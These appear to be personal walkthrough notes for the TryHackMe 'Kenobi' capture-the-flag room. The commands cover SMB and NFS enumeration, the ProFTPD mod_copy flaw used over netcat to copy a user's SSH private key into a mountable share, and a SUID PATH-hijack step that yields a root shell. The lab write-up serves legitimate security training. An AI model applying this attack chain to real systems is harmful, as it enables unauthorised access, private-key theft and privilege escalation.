[https://tryhackme.com/room/kenobi](https://tryhackme.com/room/kenobi)
 
445 smb  
139 smb  
22 ssh  
80 http  
21 ftp  
111 rpcbind  
2049 nfs_acl
 
anonymous //smb share//
 
/icons  
/admin.html  
/robots.txt
 
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.77.111
 
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.77.111
 
get log.txt
 
/home/kenobi/.ssh/id_rsa
 
smbget -R smb://<ip>/anonymous  
(to recursively download whole smb share)
 
searchsploit Proftpd 1.3.5  
'mod_copy'
 
^ we see that the exploit says there is a vuln in the SITE CPFR and SITE CPTO commands where anyone can copy a file from one place to another
 
connect to ftp and copy the id_rsa to a share we have access to:
 
nc <ip> 21  
SITE CPFR /home/kenobi/.ssh/id_rsa  
SITE CPTO /var/tmp/id_rsa
 
mount /var to attacker machine:  
mkdir /mnt/kenobiNFS  
mount target_machine_ip:/var /mnt/kenobiNFS  
ls -la /mnt/kenobiNFS
 
cp /mnt/kenobiNFS/tmp/id_rsa .
 
find / -type f -user root -perm /4000 2>/dev/null  
/usr/bin/menu  
strings menu  
'curl ...'
 
echo /bin/sh > /tmp/curl  
export PATH=/tmp:$PATH  
chmod 777 curl
 
/usr/bin/menu
 
root shell!
 
LL:  
nmap scripts for smb and nfs  
connecting to ftp through netcat (nc IP 21)  
Using vuln SITE CPFR/CPTO to move id_rsa to shared nfs direcrory /var (known from nmap script)  
mounted new local dir to target /var  
strings on SUID file  
PATH injection